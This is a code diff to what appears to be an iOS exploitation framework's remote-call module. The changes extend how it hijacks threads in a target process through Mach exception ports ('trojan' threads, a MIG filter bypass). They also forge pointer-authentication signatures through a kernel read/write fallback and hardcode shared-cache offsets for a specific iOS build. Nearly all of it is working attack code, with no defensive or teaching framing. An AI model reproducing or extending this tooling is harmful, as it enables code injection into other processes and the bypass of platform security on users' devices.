@@ -11,6 +11,7 @@
 #import <dlfcn.h>
 #import <pthread.h>
 #import <signal.h>
+#import <stddef.h>
 #import <stdint.h>
 #import <stdlib.h>
 #import <string.h>
@@ -53,6 +54,35 @@ extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t address, 
 #define FAKE_LR_TROJAN_CREATOR          0x201
 #define FAKE_PC_TROJAN                  0x301
 #define FAKE_LR_TROJAN                  0x401
+#define CND_RC_IDENTITY_MESSAGE_ID      2407
+/* 23A341 arm64e shared-cache addresses: _getpid=0x22b0d8138 and a
+ * deterministic `brk #1` instruction=0x22b0d6440.  The relative offset is
+ * slide-independent and is validated against the local mapping before use. */
+#define CND_RC_GETPID_TO_BRK1_DELTA     (-0x1cf8LL)
+#define CND_RC_BRK1_INSTRUCTION         0xd4200020U
+
+typedef struct {
+    mach_msg_header_t Head;
+    mach_msg_body_t msgh_body;
+    mach_msg_port_descriptor_t thread;
+    mach_msg_port_descriptor_t task;
+    NDR_record_t NDR;
+    exception_type_t exception;
+    mach_msg_type_number_t codeCnt;
+    int64_t code[2];
+    int flavor;
+    mach_msg_type_number_t old_stateCnt;
+    natural_t old_state[1296];
+} __attribute__((packed, aligned(4))) CNDRemoteCallIdentityRequest;
+
+typedef struct {
+    mach_msg_header_t Head;
+    NDR_record_t NDR;
+    kern_return_t RetCode;
+    int flavor;
+    mach_msg_type_number_t new_stateCnt;
+    natural_t new_state[1296];
+} __attribute__((packed, aligned(4))) CNDRemoteCallIdentityReply;
 
 // from https://github.com/nickingravallo/Machium/blob/main/Machium/Breakpoint.h
 #define BREAKPOINT_ENABLE 481
@@ -128,6 +158,22 @@ typedef struct RemoteCallState {
     int firstExceptionTimeoutMS;
     int stableExceptionTimeoutFloorMS;
     bool originalThreadOnly;
+    bool identityBootstrapRequested;
+    bool identityMessageValid;
+    bool identityThreadRightExact;
+    bool identityTaskRightExact;
+    bool identityHandlerDowngraded;
+    bool identityHandlerRetained;
+    bool identityInitialConversionSucceeded;
+    bool identityInitialReplySucceeded;
+    mach_port_t identityThreadPort;
+    uint64_t identityThreadAddr;
+    uint64_t identityTrapAddress;
+    uint64_t identityConversionCount;
+    uint64_t identityConversionFailures;
+    bool identityConverterUnavailable;
+    uint64_t identityPACFallbackCount;
+    uint64_t identityPACFallbackFailures;
     uint64_t stableCalls;
     uint64_t stableFailures;
     uint64_t ioFailures;
@@ -202,6 +248,22 @@ static void remote_call_pop_state(RemoteCallState *previous)
 #define g_RC_firstExceptionTimeoutMS (remote_call_current_state()->firstExceptionTimeoutMS)
 #define g_RC_stableExceptionTimeoutFloorMS (remote_call_current_state()->stableExceptionTimeoutFloorMS)
 #define g_RC_originalThreadOnly      (remote_call_current_state()->originalThreadOnly)
+#define g_RC_identityBootstrapRequested (remote_call_current_state()->identityBootstrapRequested)
+#define g_RC_identityMessageValid   (remote_call_current_state()->identityMessageValid)
+#define g_RC_identityThreadRightExact (remote_call_current_state()->identityThreadRightExact)
+#define g_RC_identityTaskRightExact (remote_call_current_state()->identityTaskRightExact)
+#define g_RC_identityHandlerDowngraded (remote_call_current_state()->identityHandlerDowngraded)
+#define g_RC_identityHandlerRetained (remote_call_current_state()->identityHandlerRetained)
+#define g_RC_identityInitialConversionSucceeded (remote_call_current_state()->identityInitialConversionSucceeded)
+#define g_RC_identityInitialReplySucceeded (remote_call_current_state()->identityInitialReplySucceeded)
+#define g_RC_identityThreadPort     (remote_call_current_state()->identityThreadPort)
+#define g_RC_identityThreadAddr     (remote_call_current_state()->identityThreadAddr)
+#define g_RC_identityTrapAddress   (remote_call_current_state()->identityTrapAddress)
+#define g_RC_identityConversionCount (remote_call_current_state()->identityConversionCount)
+#define g_RC_identityConversionFailures (remote_call_current_state()->identityConversionFailures)
+#define g_RC_identityConverterUnavailable (remote_call_current_state()->identityConverterUnavailable)
+#define g_RC_identityPACFallbackCount (remote_call_current_state()->identityPACFallbackCount)
+#define g_RC_identityPACFallbackFailures (remote_call_current_state()->identityPACFallbackFailures)
 #define g_RC_stableCalls             (remote_call_current_state()->stableCalls)
 #define g_RC_stableFailures          (remote_call_current_state()->stableFailures)
 #define g_RC_ioFailures              (remote_call_current_state()->ioFailures)
@@ -448,7 +510,215 @@ static void reap_dead_port_names_if_needed(const char *reason)
     (void)reap_dead_port_names(reason);
 }
 
-bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread, bool useMigFilterBypass) {
+static exception_mask_t remote_call_exception_mask(void)
+{
+    return EXC_MASK_GUARD |
+           EXC_MASK_BAD_ACCESS |
+           EXC_MASK_BAD_INSTRUCTION |
+           EXC_MASK_BREAKPOINT |
+           EXC_MASK_ARITHMETIC;
+}
+
+static kern_return_t remote_call_receive_identity(
+    mach_port_t receivePort, CNDRemoteCallIdentityRequest *request,
+    int timeoutMS)
+{
+    if (!request || !MACH_PORT_VALID(receivePort) || timeoutMS <= 0) {
+        return KERN_INVALID_ARGUMENT;
+    }
+    union {
+        CNDRemoteCallIdentityRequest request;
+        uint8_t bytes[sizeof(CNDRemoteCallIdentityRequest) +
+            sizeof(mach_msg_max_trailer_t)];
+    } receive = {0};
+    kern_return_t kr = mach_msg(&receive.request.Head,
+        MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(receive), receivePort,
+        timeoutMS, MACH_PORT_NULL);
+    if (kr == KERN_SUCCESS) *request = receive.request;
+    return kr;
+}
+
+static bool remote_call_identity_request_is_valid(
+    const CNDRemoteCallIdentityRequest *request)
+{
+    size_t requiredSize = offsetof(CNDRemoteCallIdentityRequest, old_state) +
+        sizeof(arm_thread_state64_internal);
+    return request &&
+        request->Head.msgh_id == CND_RC_IDENTITY_MESSAGE_ID &&
+        request->Head.msgh_size >= requiredSize &&
+        (request->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) != 0 &&
+        request->msgh_body.msgh_descriptor_count == 2 &&
+        request->thread.type == MACH_MSG_PORT_DESCRIPTOR &&
+        request->task.type == MACH_MSG_PORT_DESCRIPTOR &&
+        MACH_PORT_VALID(request->thread.name) &&
+        MACH_PORT_VALID(request->task.name) &&
+        request->flavor == ARM_THREAD_STATE64 &&
+        request->old_stateCnt == ARM_THREAD_STATE64_COUNT;
+}
+
+static kern_return_t remote_call_reply_identity(
+    const CNDRemoteCallIdentityRequest *request,
+    const arm_thread_state64_internal *state)
+{
+    if (!request || !state ||
+        !MACH_PORT_VALID(request->Head.msgh_remote_port)) {
+        return KERN_INVALID_ARGUMENT;
+    }
+    CNDRemoteCallIdentityReply reply = {0};
+    reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MOVE_SEND_ONCE, 0);
+    reply.Head.msgh_remote_port = request->Head.msgh_remote_port;
+    reply.Head.msgh_id = request->Head.msgh_id + 100;
+    reply.NDR = request->NDR;
+    reply.RetCode = KERN_SUCCESS;
+    reply.flavor = ARM_THREAD_STATE64;
+    reply.new_stateCnt = ARM_THREAD_STATE64_COUNT;
+    memcpy(reply.new_state, state, sizeof(*state));
+    reply.Head.msgh_size = (mach_msg_size_t)(
+        offsetof(CNDRemoteCallIdentityReply, new_state) + sizeof(*state));
+    return mach_msg(&reply.Head, MACH_SEND_MSG, reply.Head.msgh_size, 0,
+        MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+}
+
+static void remote_call_release_identity_thread_right(void)
+{
+    if (MACH_PORT_VALID(g_RC_identityThreadPort)) {
+        mach_port_deallocate(mach_task_self_, g_RC_identityThreadPort);
+    }
+    g_RC_identityThreadPort = MACH_PORT_NULL;
+}
+
+static void remote_call_release_identity_request_rights(
+    CNDRemoteCallIdentityRequest *request, bool retainThread)
+{
+    if (!request) return;
+    if (MACH_PORT_VALID(request->task.name)) {
+        mach_port_deallocate(mach_task_self_, request->task.name);
+        request->task.name = MACH_PORT_NULL;
+    }
+    if (!retainThread && MACH_PORT_VALID(request->thread.name)) {
+        mach_port_deallocate(mach_task_self_, request->thread.name);
+        request->thread.name = MACH_PORT_NULL;
+    }
+}
+
+typedef struct {
+    ExceptionMessage exception;
+    CNDRemoteCallIdentityRequest identityRequest;
+    bool usesIdentity;
+} CNDRemoteCallOriginalThreadException;
+
+static bool remote_call_wait_original_thread_exception(
+    mach_port_t exceptionPort,
+    CNDRemoteCallOriginalThreadException *event,
+    int timeoutMS)
+{
+    if (!event) return false;
+    memset(event, 0, sizeof(*event));
+
+    if (!g_RC_identityHandlerRetained) {
+        return wait_exception(exceptionPort, &event->exception,
+                              timeoutMS, false);
+    }
+
+    kern_return_t receiveKR = remote_call_receive_identity(
+        exceptionPort, &event->identityRequest, timeoutMS);
+    if (receiveKR != KERN_SUCCESS ||
+        !remote_call_identity_request_is_valid(&event->identityRequest)) {
+        printf("[RemoteCall] subsequent identity exception invalid "
+               "kr=0x%x id=%d size=%u descriptors=%u flavor=%d count=%u\n",
+               receiveKR, event->identityRequest.Head.msgh_id,
+               event->identityRequest.Head.msgh_size,
+               event->identityRequest.msgh_body.msgh_descriptor_count,
+               event->identityRequest.flavor,
+               event->identityRequest.old_stateCnt);
+        remote_call_release_identity_request_rights(
+            &event->identityRequest, false);
+        return false;
+    }
+
+    /* task_get_ipc_port_kobject() takes a kernel task address, not the
+     * mach_task_self_ port name.  The first identity message is resolved with
+     * task_self() during bootstrap; use the same kernel task here for every
+     * duplicate identity right delivered by later exceptions. */
+    uint64_t selfTask = task_self();
+    uint64_t deliveredThread = task_get_ipc_port_kobject(
+        selfTask, event->identityRequest.thread.name);
+    uint64_t deliveredTask = task_get_ipc_port_kobject(
+        selfTask, event->identityRequest.task.name);
+    if (deliveredThread != g_RC_identityThreadAddr ||
+        deliveredTask != g_RC_taskAddr) {
+        printf("[RemoteCall] subsequent identity right mismatch "
+               "thread=%#llx expected=%#llx task=%#llx expected=%#llx\n",
+               deliveredThread, g_RC_identityThreadAddr,
+               deliveredTask, g_RC_taskAddr);
+        (void)remote_call_reply_identity(&event->identityRequest,
+            (const arm_thread_state64_internal *)
+                event->identityRequest.old_state);
+        remote_call_release_identity_request_rights(
+            &event->identityRequest, false);
+        return false;
+    }
+
+    event->usesIdentity = true;
+    memcpy(&event->exception.threadState,
+           event->identityRequest.old_state,
+           sizeof(event->exception.threadState));
+    event->exception.exception =
+        (uint32_t)event->identityRequest.exception;
+    event->exception.codeCnt = event->identityRequest.codeCnt;
+    if (event->identityRequest.codeCnt > 0) {
+        event->exception.codeFirst =
+            (uint64_t)event->identityRequest.code[0];
+    }
+    if (event->identityRequest.codeCnt > 1) {
+        event->exception.codeSecond =
+            (uint64_t)event->identityRequest.code[1];
+    }
+    return true;
+}
+
+static bool remote_call_reply_original_thread_exception(
+    CNDRemoteCallOriginalThreadException *event,
+    const arm_thread_state64_internal *state)
+{
+    if (!event || !state) return false;
+    if (!event->usesIdentity) {
+        return reply_with_state(&event->exception,
+                                (arm_thread_state64_internal *)state);
+    }
+
+    kern_return_t replyKR = remote_call_reply_identity(
+        &event->identityRequest, state);
+    remote_call_release_identity_request_rights(
+        &event->identityRequest, false);
+    event->usesIdentity = false;
+    return replyKR == KERN_SUCCESS;
+}
+
+static uint64_t remote_call_resolve_identity_trap_address(void)
+{
+    uint64_t getpidAddress = native_strip(
+        (uint64_t)(uintptr_t)dlsym(RTLD_DEFAULT, "getpid"));
+    if (!getpidAddress) return 0;
+
+    uint64_t trapAddress = (uint64_t)(
+        (int64_t)getpidAddress + CND_RC_GETPID_TO_BRK1_DELTA);
+    uint32_t instruction = 0;
+    memcpy(&instruction, (const void *)(uintptr_t)trapAddress,
+           sizeof(instruction));
+    if (instruction != CND_RC_BRK1_INSTRUCTION) {
+        printf("[RemoteCall] 23A341 shared-cache trap validation failed "
+               "getpid=%#llx trap=%#llx instruction=%#x\n",
+               getpidAddress, trapAddress, instruction);
+        return 0;
+    }
+    return trapAddress;
+}
+
+bool set_exception_port_on_thread(mach_port_t exceptionPort,
+                                  uint64_t currThread,
+                                  bool useMigFilterBypass,
+                                  exception_behavior_t behavior) {
     bool success = false;
     
     void* thread_set_exception_ports_addr = dlsym(RTLD_DEFAULT, "thread_set_exception_ports");
@@ -522,16 +792,12 @@ bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread
     arm_thread_state64_set_pc_fptr(state, thread_set_exception_ports_addr);
     arm_thread_state64_set_lr_fptr(state, pthread_exit_addr);
     
-    uint64_t exceptionMask = EXC_MASK_GUARD |
-                             EXC_MASK_BAD_ACCESS |
-                             EXC_MASK_BAD_INSTRUCTION |
-                             EXC_MASK_BREAKPOINT |
-                             EXC_MASK_ARITHMETIC;
+    exception_mask_t exceptionMask = remote_call_exception_mask();
 
     state.__x[0] = g_RC_dummyThreadMach;
     state.__x[1] = exceptionMask;
     state.__x[2] = exceptionPort;
-    state.__x[3] = EXCEPTION_STATE | MACH_EXCEPTION_CODES;
+    state.__x[3] = behavior;
     state.__x[4] = ARM_THREAD_STATE64;
     
     if(useMigFilterBypass)
@@ -651,7 +917,8 @@ bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread
     
     thread_set_mutex(g_RC_dummyThreadAddr, 0x40000000);
     
-    thread_set_exception_ports(g_RC_dummyThreadMach, 0, exceptionPort, EXCEPTION_STATE | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
+    thread_set_exception_ports(g_RC_dummyThreadMach, 0, exceptionPort,
+                               behavior, ARM_THREAD_STATE64);
 
     if(useMigFilterBypass)
         usleep(100000);
@@ -660,11 +927,34 @@ bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread
     return success;
 }
 
-void sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint64_t pc, uint64_t lr)
+bool sign_state(uint64_t signingThread, arm_thread_state64_internal *state,
+                uint64_t pc, uint64_t lr)
 {
+    if (!state || (!pc && !lr)) return false;
     reap_dead_port_names_if_needed("sign_state");
 
     if(gIsPACSupported) {
+        bool identityPACFallback = false;
+        if (MACH_PORT_VALID(g_RC_identityThreadPort) &&
+            signingThread == g_RC_identityThreadAddr) {
+            if (!g_RC_identityConverterUnavailable) {
+                bool converted = thread_convert_sign_state_for_target(
+                    g_RC_identityThreadPort, state, pc, lr);
+                if (converted) {
+                    g_RC_identityConversionCount++;
+                    return true;
+                }
+                g_RC_identityConversionFailures++;
+                g_RC_identityConverterUnavailable = true;
+                printf("[RemoteCall] identity-delivered public converter "
+                       "rejected the cross-task right thread=%#llx "
+                       "port=0x%x pc=%#llx lr=%#llx; trying the existing "
+                       "physical KRW PAC-context fallback\n",
+                       signingThread, g_RC_identityThreadPort, pc, lr);
+            }
+            identityPACFallback = true;
+        }
+
         uint64_t diver = 0;
         diver = (uint64_t)state->__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
         uint64_t discPC = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("pc"));
@@ -675,6 +965,11 @@ void sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint
             flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
             state->__flags = flags;
             state->__pc = remote_pac(signingThread, pc, discPC);
+            if (!state->__pc || state->__pc == UINT64_MAX) {
+                if (identityPACFallback)
+                    g_RC_identityPACFallbackFailures++;
+                return false;
+            }
         }
         if (lr) {
             uint32_t flags = state->__flags;
@@ -682,14 +977,21 @@ void sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint
                        __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
             state->__flags = flags;
             state->__lr = remote_pac(signingThread, lr, discLR);
+            if (!state->__lr || state->__lr == UINT64_MAX) {
+                if (identityPACFallback)
+                    g_RC_identityPACFallbackFailures++;
+                return false;
+            }
         }
-        return;
+        if (identityPACFallback) g_RC_identityPACFallbackCount++;
+        return true;
     }
     
     if(!gIsPACSupported) {
         if (pc) state->__pc = pc;
         if (lr) state->__lr = lr;
     }
+    return true;
 }
 
 bool remote_call_current_success(void)
@@ -836,24 +1138,38 @@ static uint64_t do_remote_call_temp_internal(int timeout, const char *name,
     int newTimeout = (floorTimeout > timeout) ? floorTimeout : timeout;
     uint64_t pcAddr = native_strip((uint64_t)dlsym(RTLD_DEFAULT, name));
 
-    ExceptionMessage exc;
-    if (!wait_exception(g_RC_firstExceptionPort, &exc, newTimeout, false)) {
+    CNDRemoteCallOriginalThreadException firstEvent = {0};
+    if (!remote_call_wait_original_thread_exception(
+            g_RC_firstExceptionPort, &firstEvent, newTimeout)) {
         printf("[%s:%d] Don't receive first exception on original thread\n", __FUNCTION__, __LINE__);
         g_RC_success = false;
         remote_call_note_stable_failure(name, "original-thread first exception timeout");
         return 0;
     }
+    ExceptionMessage *exc = &firstEvent.exception;
 
-    exc.threadState.__x[0] = x0;
-    exc.threadState.__x[1] = x1;
-    exc.threadState.__x[2] = x2;
-    exc.threadState.__x[3] = x3;
-    exc.threadState.__x[4] = x4;
-    exc.threadState.__x[5] = x5;
-    exc.threadState.__x[6] = x6;
-    exc.threadState.__x[7] = x7;
-    sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN_CREATOR);
-    if (!reply_with_state(&exc, &exc.threadState)) {
+    arm_thread_state64_internal interruptedState = exc->threadState;
+    exc->threadState.__x[0] = x0;
+    exc->threadState.__x[1] = x1;
+    exc->threadState.__x[2] = x2;
+    exc->threadState.__x[3] = x3;
+    exc->threadState.__x[4] = x4;
+    exc->threadState.__x[5] = x5;
+    exc->threadState.__x[6] = x6;
+    exc->threadState.__x[7] = x7;
+    uint64_t completionTrap = g_RC_identityHandlerRetained
+        ? g_RC_identityTrapAddress : FAKE_LR_TROJAN_CREATOR;
+    if (!sign_state(g_RC_trojanThreadAddr, &exc->threadState, pcAddr,
+                    completionTrap)) {
+        g_RC_success = false;
+        remote_call_note_stable_failure(
+            name, "original-thread target conversion failed");
+        (void)remote_call_reply_original_thread_exception(
+            &firstEvent, &interruptedState);
+        return 0;
+    }
+    if (!remote_call_reply_original_thread_exception(
+            &firstEvent, &exc->threadState)) {
         g_RC_success = false;
         remote_call_note_stable_failure(
             name, "original-thread dispatch exception reply failed");
@@ -865,29 +1181,32 @@ static uint64_t do_remote_call_temp_internal(int timeout, const char *name,
         return 0;
     }
 
-    ExceptionMessage exc2;
-    if (!wait_exception(g_RC_firstExceptionPort, &exc2, newTimeout, false)) {
+    CNDRemoteCallOriginalThreadException secondEvent = {0};
+    if (!remote_call_wait_original_thread_exception(
+            g_RC_firstExceptionPort, &secondEvent, newTimeout)) {
         printf("[%s:%d] Don't receive second exception on original thread\n", __FUNCTION__, __LINE__);
         g_RC_success = false;
         remote_call_note_stable_failure(name, "original-thread second exception timeout");
         return 0;
     }
-    uint64_t retValue = exc2.threadState.__x[0];
-    uint64_t completionPC = native_strip(exc2.threadState.__pc);
-    if (completionPC != FAKE_LR_TROJAN_CREATOR) {
+    ExceptionMessage *exc2 = &secondEvent.exception;
+    uint64_t retValue = exc2->threadState.__x[0];
+    uint64_t completionPC = native_strip(exc2->threadState.__pc);
+    if (completionPC != completionTrap) {
         printf("[RemoteCall] unexpected original-thread completion "
                "function=%s exception=%u code=(%#llx,%#llx) "
                "pc=%#llx stripped-pc=%#llx lr=%#llx x0=%#llx\n",
-               name, exc2.exception,
-               exc2.codeFirst, exc2.codeSecond,
-               exc2.threadState.__pc, completionPC,
-               exc2.threadState.__lr, retValue);
+               name, exc2->exception,
+               exc2->codeFirst, exc2->codeSecond,
+               exc2->threadState.__pc, completionPC,
+               exc2->threadState.__lr, retValue);
     }
-    if (!reply_with_state(&exc2, &exc2.threadState)) {
+    if (!remote_call_reply_original_thread_exception(
+            &secondEvent, &exc2->threadState)) {
         g_RC_success = false;
         remote_call_note_stable_failure(
             name,
-            completionPC == FAKE_LR_TROJAN_CREATOR
+            completionPC == completionTrap
                 ? "original-thread completion reply right died"
                 : "original-thread fault reply right died");
         return 0;
@@ -1011,6 +1330,7 @@ static uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr
         return 0;
     }
 
+    arm_thread_state64_internal interruptedState = exc.threadState;
     // Running bootstrap pthreads first trap at their natural return from
     // usleep(). Preserve that exact, already kernel-signed state before the
     // first synthetic call. Teardown can later return the pthread to its real
@@ -1035,7 +1355,15 @@ static uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr
     exc.threadState.__x[7] = x7;
     // PAC keys are thread-scoped. Calls running on the synthetic pthread must
     // be signed with that pthread's keys, not the originally trapped worker's.
-    sign_state(g_RC_callThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN);
+    if (!sign_state(g_RC_callThreadAddr, &exc.threadState, pcAddr,
+                    FAKE_LR_TROJAN)) {
+        g_RC_success = false;
+        remote_call_note_stable_failure(
+            name ?: "(addr-call)",
+            "synthetic-thread target signing failed");
+        (void)reply_with_state(&exc, &interruptedState);
+        return 0;
+    }
     if (!reply_with_state(&exc, &exc.threadState)) {
         g_RC_success = false;
         remote_call_note_stable_failure(
@@ -1090,19 +1418,26 @@ static uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr
 
 bool restore_trojan_thread(arm_thread_state64_internal *state)
 {
-    ExceptionMessage exc;
+    CNDRemoteCallOriginalThreadException event = {0};
     int restoreTimeoutMS = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 20000;
     if (restoreTimeoutMS < 1000) restoreTimeoutMS = 1000;
-    if (!wait_exception(g_RC_firstExceptionPort, &exc, restoreTimeoutMS, false)) {
+    if (!remote_call_wait_original_thread_exception(
+            g_RC_firstExceptionPort, &event, restoreTimeoutMS)) {
         printf("[%s:%d] Failed to receive exception while restoring within %dms\n",
                __FUNCTION__, __LINE__, restoreTimeoutMS);
         return false;
     }
+    ExceptionMessage *exc = &event.exception;
     
-    state->__flags = exc.threadState.__flags;
-    sign_state(g_RC_trojanThreadAddr, state, state->__pc, state->__lr);
-    reply_with_state(&exc, state);
-    return true;
+    state->__flags = exc->threadState.__flags;
+    if (!sign_state(g_RC_trojanThreadAddr, state,
+                    state->__pc, state->__lr)) {
+        printf("[RemoteCall] Failed to convert original target state during restore.\n");
+        (void)remote_call_reply_original_thread_exception(
+            &event, &exc->threadState);
+        return false;
+    }
+    return remote_call_reply_original_thread_exception(&event, state);
 }
 
 static bool remote_call_target_contains_thread(uint64_t targetThread)
@@ -1147,8 +1482,11 @@ static bool remote_call_restore_natural_state_from_exception(
     // not reusable at a later exception handoff.
     arm_thread_state64_internal resumeState = g_RC_callThreadResumeState;
     resumeState.__flags = exc->threadState.__flags;
-    sign_state(g_RC_callThreadAddr, &resumeState,
-               resumeState.__pc, resumeState.__lr);
+    if (!sign_state(g_RC_callThreadAddr, &resumeState,
+                    resumeState.__pc, resumeState.__lr)) {
+        printf("[RemoteCall] Failed to sign synthetic natural return state.\n");
+        return false;
+    }
     printf("[RemoteCall] Restoring synthetic natural state pc=%#llx lr=%#llx flags=%#x from-current-flags=%#x.\n",
            g_RC_callThreadResumeState.__pc,
            g_RC_callThreadResumeState.__lr,
@@ -1258,6 +1596,7 @@ static void abandon_remote_call_internal(void) {
     if (MACH_PORT_VALID(g_RC_dummyThreadMach)) {
         mach_port_deallocate(mach_task_self_, g_RC_dummyThreadMach);
     }
+    remote_call_release_identity_thread_right();
     clear_remote_shmem_cache();
     (void)reap_dead_port_names("abandon_remote_call");
     g_RC_taskAddr = 0;
@@ -1356,6 +1695,7 @@ static int destroy_remote_call_internal(void) {
     if (MACH_PORT_VALID(g_RC_dummyThreadMach)) {
         mach_port_deallocate(mach_task_self_, g_RC_dummyThreadMach);
     }
+    remote_call_release_identity_thread_right();
     clear_remote_shmem_cache();
     (void)reap_dead_port_names("destroy_remote_call");
     g_RC_taskAddr = 0;
@@ -1400,6 +1740,7 @@ bool remote_call_has_local_state(void) {
            MACH_PORT_VALID(g_RC_dummyThreadMach) ||
            g_RC_dummyThreadAddr ||
            g_RC_dummyThreadTro ||
+           MACH_PORT_VALID(g_RC_identityThreadPort) ||
            g_RC_vmMap ||
            g_RC_callThreadAddr ||
            g_RC_trojanThreadAddr ||
@@ -1429,6 +1770,31 @@ bool remote_call_copy_debug_snapshot(RemoteCallDebugSnapshot *outSnapshot)
     outSnapshot->ioFailures = g_RC_ioFailures;
     outSnapshot->shmemEvictions = g_RC_shmemEvictions;
     outSnapshot->shmemClock = g_RC_shmemClock;
+    outSnapshot->identityBootstrapRequested =
+        g_RC_identityBootstrapRequested;
+    outSnapshot->identityMessageValid = g_RC_identityMessageValid;
+    outSnapshot->identityThreadRightExact =
+        g_RC_identityThreadRightExact;
+    outSnapshot->identityTaskRightExact = g_RC_identityTaskRightExact;
+    outSnapshot->identityHandlerDowngraded =
+        g_RC_identityHandlerDowngraded;
+    outSnapshot->identityHandlerRetained =
+        g_RC_identityHandlerRetained;
+    outSnapshot->identityInitialConversionSucceeded =
+        g_RC_identityInitialConversionSucceeded;
+    outSnapshot->identityInitialReplySucceeded =
+        g_RC_identityInitialReplySucceeded;
+    outSnapshot->identityThreadAddr = g_RC_identityThreadAddr;
+    outSnapshot->identityTrapAddress = g_RC_identityTrapAddress;
+    outSnapshot->identityConversionCount = g_RC_identityConversionCount;
+    outSnapshot->identityConversionFailures =
+        g_RC_identityConversionFailures;
+    outSnapshot->identityConverterUnavailable =
+        g_RC_identityConverterUnavailable;
+    outSnapshot->identityPACFallbackCount =
+        g_RC_identityPACFallbackCount;
+    outSnapshot->identityPACFallbackFailures =
+        g_RC_identityPACFallbackFailures;
     for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
         if (g_RC_shmemCache[i].used) outSnapshot->shmemUsed++;
     }
@@ -1746,6 +2112,20 @@ static int init_remote_call_configured(const char* process,
     g_RC_stableCalls = 0;
     g_RC_stableFailures = 0;
     g_RC_ioFailures = 0;
+    g_RC_identityMessageValid = false;
+    g_RC_identityThreadRightExact = false;
+    g_RC_identityTaskRightExact = false;
+    g_RC_identityHandlerDowngraded = false;
+    g_RC_identityHandlerRetained = false;
+    g_RC_identityInitialConversionSucceeded = false;
+    g_RC_identityInitialReplySucceeded = false;
+    g_RC_identityThreadAddr = 0;
+    g_RC_identityTrapAddress = 0;
+    g_RC_identityConversionCount = 0;
+    g_RC_identityConversionFailures = 0;
+    g_RC_identityConverterUnavailable = false;
+    g_RC_identityPACFallbackCount = 0;
+    g_RC_identityPACFallbackFailures = 0;
     memset(g_RC_lastStableCall, 0, sizeof(remote_call_current_state()->lastStableCall));
     memset(g_RC_lastStableFailure, 0, sizeof(remote_call_current_state()->lastStableFailure));
     memset(g_RC_lastStableFailureReason, 0, sizeof(remote_call_current_state()->lastStableFailureReason));
@@ -2004,17 +2384,26 @@ static int init_remote_call_configured(const char* process,
         [NSMutableArray arrayWithCapacity:threadSnapshot.count];
     NSMutableIndexSet *includedIndices = [NSMutableIndexSet indexSet];
 
-    /* Reverse the spread ranks so newly inserted dispatch workers are armed
-     * before they have time to retire. */
-    for (NSUInteger rank = 0; rank < desiredGuardCount; rank++) {
-        NSUInteger spreadRank = desiredGuardCount - 1 - rank;
-        NSUInteger index = desiredGuardCount == 1
-            ? threadSnapshot.count - 1
-            : (spreadRank * (threadSnapshot.count - 1)) /
-                (desiredGuardCount - 1);
-        if (![includedIndices containsIndex:index]) {
-            [candidateIndices addObject:@(index)];
-            [includedIndices addIndex:index];
+    if (g_RC_identityBootstrapRequested && desiredGuardCount == 1) {
+        /* Stock foreground apps can leave their newest dispatch workers
+         * blocked indefinitely.  Identity mode intentionally arms only one
+         * thread, so choose the oldest task thread (the app main thread) and
+         * let a normal scene activation drive it across the AST boundary. */
+        [candidateIndices addObject:@0];
+        [includedIndices addIndex:0];
+    } else {
+        /* Reverse the spread ranks so newly inserted dispatch workers are
+         * armed before they have time to retire. */
+        for (NSUInteger rank = 0; rank < desiredGuardCount; rank++) {
+            NSUInteger spreadRank = desiredGuardCount - 1 - rank;
+            NSUInteger index = desiredGuardCount == 1
+                ? threadSnapshot.count - 1
+                : (spreadRank * (threadSnapshot.count - 1)) /
+                    (desiredGuardCount - 1);
+            if (![includedIndices containsIndex:index]) {
+                [candidateIndices addObject:@(index)];
+                [includedIndices addIndex:index];
+            }
         }
     }
     /* Integer spread rounding can duplicate indices, and any primary may die
@@ -2030,10 +2419,13 @@ static int init_remote_call_configured(const char* process,
     NSUInteger primaryCandidateCount = MIN(
         desiredGuardCount, candidateIndices.count);
     printf("[RemoteCall] %s thread snapshot total=%lu desired-guards=%lu "
-           "candidate-order=%lu strategy=newest-first-spread-with-fallback\n",
+           "candidate-order=%lu strategy=%s\n",
            process, (unsigned long)threadSnapshot.count,
            (unsigned long)desiredGuardCount,
-           (unsigned long)candidateIndices.count);
+           (unsigned long)candidateIndices.count,
+           g_RC_identityBootstrapRequested
+               ? "identity-oldest-main-first-with-fallback"
+               : "newest-first-spread-with-fallback");
     
     g_RC_trojanThreadAddr = 0;
     
@@ -2063,8 +2455,13 @@ static int init_remote_call_configured(const char* process,
             continue;
         }
         validThreadCount++;
+        exception_behavior_t bootstrapBehavior =
+            g_RC_identityBootstrapRequested
+                ? (EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES)
+                : (EXCEPTION_STATE | MACH_EXCEPTION_CODES);
         if (!set_exception_port_on_thread(g_RC_firstExceptionPort, currThread,
-                                          useMigFilterBypass)) {
+                                          useMigFilterBypass,
+                                          bootstrapBehavior)) {
             printf("[%s:%d] Set exception port on thread:%#llx failed\n",
                    __FUNCTION__, __LINE__, currThread);
             continue;
@@ -2118,11 +2515,44 @@ static int init_remote_call_configured(const char* process,
         }
     }
 
-    ExceptionMessage exc;
+    ExceptionMessage exc = {0};
